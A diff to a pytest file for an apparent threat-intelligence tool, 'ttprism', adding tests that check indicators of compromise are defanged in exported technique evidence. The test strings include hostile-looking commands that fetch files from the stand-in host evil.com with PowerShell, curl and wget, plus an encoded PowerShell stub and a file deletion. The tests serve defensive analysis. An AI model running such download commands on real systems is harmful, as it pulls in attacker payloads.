@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import csv
+import dataclasses
 import io
 import json
 from typing import Any
@@ -8,7 +9,7 @@ from typing import Any
 import pytest
 
 from ttprism import IOC, AnalysisOptions, AnalysisResult, IOCType, TechniqueMatch, analyze_cape, analyze_text
-from ttprism.export import escape_csv_cell, to_csv, to_dict, to_json
+from ttprism.export import defang_text, escape_csv_cell, to_csv, to_dict, to_json
 
 
 def sample_result() -> AnalysisResult:
@@ -56,6 +57,44 @@ def test_defanged_json() -> None:
     data = to_dict(sample_result(), defanged=True)
     assert data["defanged"] is True
     assert [i["value"] for i in data["iocs"]] == ["hxxps[://]evil[.]com/a", "evil[.]com", "+cmd[@]evil[.]com"]
+    assert data["techniques"][0]["evidence"] == ["command: powershell -enc AAAA"]
+
+
+def test_defanged_json_defangs_evidence() -> None:
+    result = sample_result()
+    result.techniques[0] = dataclasses.replace(
+        result.techniques[0],
+        evidence=("command: powershell iwr http://evil.com/a.ps1 -o a.ps1; ping 198.51.100.7",),
+    )
+    technique = to_dict(result, defanged=True)["techniques"][0]
+    assert technique["evidence"] == [
+        "command: powershell iwr hxxp[://]evil[.]com/a.ps1 -o a.ps1; ping 198[.]51[.]100[.]7"
+    ]
+    assert to_dict(result)["techniques"][0]["evidence"] == list(result.techniques[0].evidence)
+
+
+@pytest.mark.parametrize(
+    ("text", "expected"),
+    [
+        ("named in text: T1059.001", "named in text: T1059.001"),
+        ("command: cmd.exe /c del a.ps1", "command: cmd.exe /c del a.ps1"),
+        ("command: curl evil.com/x", "command: curl evil[.]com/x"),
+        ("command: send ops@evil.com", "command: send ops[@]evil[.]com"),
+        (
+            "command: wget smb://a.evil.com/s?u=https://b.evil.net/y",
+            "command: wget smb[://]a[.]evil[.]com/s?u=hxxps[://]b[.]evil[.]net/y",
+        ),
+        ("command: HTTP://user.name@EVIL.COM:8080/a.b", "command: hxxp[://]user[.]name@EVIL[.]COM:8080/a.b"),
+        ("command: ping ::ffff:198.51.100.7", "command: ping [:][:]ffff[:]198[.]51[.]100[.]7"),
+        ("command: ping 2001:db8::1 at 12:30:45", "command: ping 2001[:]db8[:][:]1 at 12:30:45"),
+        (
+            "command: curl http://[64:ff9b::198.51.100.7]/a",
+            "command: curl hxxp[://][64:ff9b::198[.]51[.]100[.]7]/a",
+        ),
+    ],
+)
+def test_defang_text(text: str, expected: str) -> None:
+    assert defang_text(text) == expected
 
 
 def test_csv_rows_and_formula_escaping() -> None:
